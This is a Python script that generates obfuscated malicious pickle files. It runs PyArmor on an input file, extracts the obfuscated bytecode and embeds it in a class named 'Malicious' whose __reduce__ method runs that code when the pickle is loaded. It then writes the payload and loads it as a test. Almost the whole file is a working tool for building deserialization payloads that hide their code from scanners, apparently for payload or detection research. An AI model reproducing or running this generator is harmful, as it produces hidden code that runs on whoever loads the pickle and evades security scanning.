import argparse
import sys
from pathlib import Path
import shutil
import subprocess
import os
from bytecode_extractor import extract_byte_literal


def make_valid_python_file(filepath, bytecode, out_file):
    template = f"""from pyarmor_runtime_000000 import __pyarmor__

import pickle

class Malicious:
    def __reduce__(self):
        return (
            __pyarmor__,
            (
                __name__,
                __file__,
                 {bytecode[0]},
            ),
        )


# Step 3: Create the payload
payload = pickle.dumps(Malicious(), protocol=2)

# Step 4: Write to file
with open("payloads/advanced/obfuscated_{out_file}.pkl", "wb") as f:
    f.write(payload)

print("Malicious pickle written to payloads/advanced/{out_file}.pkl")

with open("payloads/advanced/obfuscated_{out_file}.pkl", "rb") as f:
    print("loading the big bad")
    pickle.load(f)

"""
    print(template)
    return template


def run_pyarmor(filepath):
    cmd = f"pyarmor gen {filepath}"
    print("running pyamror")
    subprocess.run(cmd, shell=True)
    print("finihsed running pyarmor ")


def write_generator_file(template, out_file):
    output_path = f"dist/{out_file}.py"
    with open(output_path, "w") as f:
        f.write(template)
    return output_path


def check_for_pyarmor():
    directory_to_check = "payloads/obfuscated/"
    looking_for = "pyarmor_runtime_000000"

    sub_path = os.path.join(directory_to_check, looking_for)

    if os.path.isdir(sub_path):
        print("pyarmor exists")
    else:
        print("pyarmor does not exist, adding it to payloads/obfuscated")
        pyarmor_directory = "dist/pyarmor_runtime_000000"
        dst_dir = os.path.join(
            "payloads/obfuscated", os.path.basename(pyarmor_directory)
        )
        shutil.copytree(pyarmor_directory, dst_dir)


def run_generator_file(run_file):
    sys.path.append("payloads/advanced")
    cmd = f"python {run_file}"
    print("attempting to run the generator file")
    try:
        subprocess.run(cmd, shell=True)
        print("loading successful for generated payload")
    except Exception as e:
        print("Couldnt run the payload file: ", e)
        print("GENERATION FAILED")


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--filepath", help="path to file")
    parser.add_argument("--payload-name", help="what the payload for sorting purposes")
    args = parser.parse_args()

    run_pyarmor(args.filepath)
    final_file = make_valid_python_file(
        args.filepath,
        extract_byte_literal(Path(f"dist/{args.filepath}")),
        args.payload_name,
    )
    file_to_run = write_generator_file(final_file, args.payload_name)
    check_for_pyarmor()
    run_generator_file(file_to_run)
